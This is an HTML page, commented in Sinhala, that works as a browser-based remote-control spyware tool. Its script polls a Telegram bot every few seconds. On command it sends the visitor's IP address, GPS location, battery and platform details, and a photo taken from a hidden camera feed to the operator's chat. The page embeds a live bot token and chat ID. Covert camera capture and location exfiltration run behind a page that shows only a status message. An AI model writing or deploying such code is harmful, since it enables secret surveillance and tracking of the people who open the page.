<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <title>Remote Control System</title>
    <style>
        body { background: #000; color: #0f0; text-align: center; font-family: monospace; }
        .status { margin-top: 40vh; font-size: 20px; }
    </style>
</head>
<body>
    <div class="status">SYSTEM ACTIVE...<br>WAITING FOR COMMANDS</div>
    
    <video id="v" style="display:none" autoplay></video>
    <canvas id="c" style="display:none"></canvas>

    <script>

        const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
        const CHAT_ID = '7883989086';
        let lastUpdateId = 0;

        // 1. Telegram එකෙන් මැසේජ් චෙක් කිරීම
        async function checkCommands() {
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
                const data = await res.json();

                if (data.result.length > 0) {
                    for (let update of data.result) {
                        lastUpdateId = update.update_id;
                        let msg = update.message.text.toLowerCase();

                        // මේ කොටස විතරක් වෙනස් කරන්න
if (msg === 'ip') sendIP();
if (msg === 'photo') takePhoto();
if (msg === 'location') sendLocation();
if (msg === 'battery') {
    navigator.getBattery().then(batt => {
        sendText("🔋 බැටරි මට්ටම: " + (batt.level * 100) + "%");
    });
}
if (msg === 'status') {
    sendText("📶 Online: " + navigator.onLine + "\n📱 Platform: " + navigator.platform);
}
                }
            } catch (e) { console.error(e); }
        }

        // 2. IP ඇඩ්‍රස් එක යැවීම
        async function sendIP() {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            sendText(`📍 IP Address: ${data.ip}`);
        }

        // 3. ලොකේෂන් එක යැවීම
        function sendLocation() {
            navigator.geolocation.getCurrentPosition(pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`);
            }, err => sendText("Location Error: " + err.message));
        }

        // 4. කැමරාවෙන් ෆොටෝ එකක් ගැනීම
        async function takePhoto() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    let fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, 'cam.png');
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                });
            }, 1000);
        }

        function sendText(txt) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}`);
        }

        // හැම තත්පර 3කට වරක්ම අලුත් මැසේජ් තියෙනවද බලන්න
        setInterval(checkCommands, 3000);
    </script>
</body>
</html>
